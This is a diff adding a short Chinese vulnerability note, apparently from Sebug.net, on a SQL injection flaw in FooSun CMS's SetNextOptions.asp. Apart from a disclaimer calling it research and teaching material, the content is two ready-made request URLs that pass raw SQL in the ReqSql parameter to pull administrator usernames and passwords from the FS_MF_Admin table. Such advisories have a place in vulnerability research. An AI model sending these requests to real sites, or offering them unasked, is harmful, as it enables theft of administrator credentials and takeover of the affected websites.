@@ -1,0 +1,6 @@
+风讯（FooSun）SetNextOptions.asp 注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.管理员帐号：2./user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_name,3,4,5,6,7,8++from+FS_MF_Admin3.管理员密码：4./user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_pass_word,3,4,5,6,7,8++from+FS_MF_Admin
